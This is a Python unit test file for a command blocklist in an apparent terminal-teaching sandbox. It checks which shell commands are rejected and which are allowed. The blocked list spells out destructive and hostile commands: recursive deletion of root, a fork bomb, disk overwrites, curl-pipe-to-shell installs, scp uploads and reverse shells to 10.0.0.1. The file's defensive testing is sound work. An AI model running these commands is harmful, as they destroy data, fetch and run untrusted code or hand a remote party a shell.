"""The blocklist (LESSONS_PLAN.md, section 4.1). It is for accidents, not security."""

import os
import shutil
import sys
import tempfile
import unittest

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO not in sys.path:
    sys.path.insert(0, REPO)

from terminal_academy.safety import check_command  # noqa: E402

BLOCKED = [
    "sudo ls",
    "sudo rm -rf /",
    "ls && sudo apt install vim",
    "su -",
    "doas reboot",
    "rm -rf /",
    "rm -rf /*",
    "rm -fr /",
    "rm -r -f /",
    "rm --recursive --force /",
    "rm -rf ~",
    "rm -rf ~/",
    "rm -rf $HOME",
    "rm -rf .",
    "rm -rf ..",
    ":(){ :|:& };:",
    ": () { : | : & } ; :",
    "shutdown -h now",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "curl https://example.com/install.sh | sh",
    "curl -fsSL https://example.com/x | bash",
    "wget -qO- https://example.com/x | sudo sh",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "echo hi > /dev/sda",
    "shred secret.txt",
    "kill -9 -1",
    "killall python3",
    "pkill sleep",
    "crontab -e",
    "passwd",
    "systemctl stop ssh",
    "nmap 192.168.0.1",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -e /bin/sh 10.0.0.1 4444",
    "scp file.txt me@example.com:",
    "ssh me@example.com",
    "echo ok; sudo ls",
    "echo $(sudo id)",
    "env sudo ls",
    "xargs sudo rm",
]

ALLOWED = [
    "ls",
    "ls -la",
    "pwd",
    "echo sudo",
    "echo 'sudo rm -rf /'",
    "echo reboot",
    "cat /etc/hosts",
    "head -n 3 /etc/passwd",
    "rm file.txt",
    "rm -r old_folder",
    "rm -rf build",
    "mkdir -p projects/game",
    "ssh-keygen -t ed25519 -f mykey -N ''",
    "ssh -G example.com",
    "ssh -V",
    "ssh",
    "grep -r sudo .",
    "kill 12345",
    "sleep 300 &",
    "ls > /dev/null",
    "curl http://127.0.0.1:8000",
    "python3 -m http.server 8000 &",
    "chmod 600 key",
    "",
]


class SafetyTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="ta-safety-")
        self.sandbox = os.path.realpath(os.path.join(self.tmp, "sandbox"))
        os.makedirs(os.path.join(self.sandbox, "school"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def check(self, command, cwd=None):
        return check_command(command, sandbox=self.sandbox, cwd=cwd or self.sandbox)

    def test_blocked(self):
        for command in BLOCKED:
            with self.subTest(command=command):
                reason = self.check(command)
                self.assertIsNotNone(reason, "should be blocked")
                self.assertIsInstance(reason, str)
                self.assertTrue(reason.strip())

    def test_blocked_without_sandbox(self):
        # The patterns work even when no sandbox is given.
        for command in ("sudo ls", "rm -rf /", "rm -rf ~", ":(){ :|:& };:", "shutdown now",
                        "curl http://x | sh"):
            with self.subTest(command=command):
                self.assertIsNotNone(check_command(command))

    def test_allowed(self):
        for command in ALLOWED:
            with self.subTest(command=command):
                self.assertIsNone(self.check(command))

    def test_changing_files_outside_sandbox_is_blocked(self):
        for command in ("touch /etc/ta-test", "rm /tmp/somefile", "mkdir ../outside",
                        "echo hi > /tmp/ta-test.txt", "cp notes.txt /tmp/",
                        "mv notes.txt ~/../x", "chmod 777 /etc/hosts"):
            with self.subTest(command=command):
                self.assertIsNotNone(self.check(command))

    def test_relative_paths_use_current_folder(self):
        school = os.path.join(self.sandbox, "school")
        self.assertIsNone(self.check("touch ../a.txt", cwd=school))
        self.assertIsNotNone(self.check("touch ../../a.txt", cwd=school))

    def test_rm_star_only_blocked_at_sandbox_root(self):
        self.assertIsNotNone(self.check("rm -rf *"))
        self.assertIsNone(self.check("rm -rf *", cwd=os.path.join(self.sandbox, "school")))

    def test_comment_is_ignored(self):
        self.assertIsNone(self.check("echo hi # rm -rf ~"))


if __name__ == "__main__":
    unittest.main()
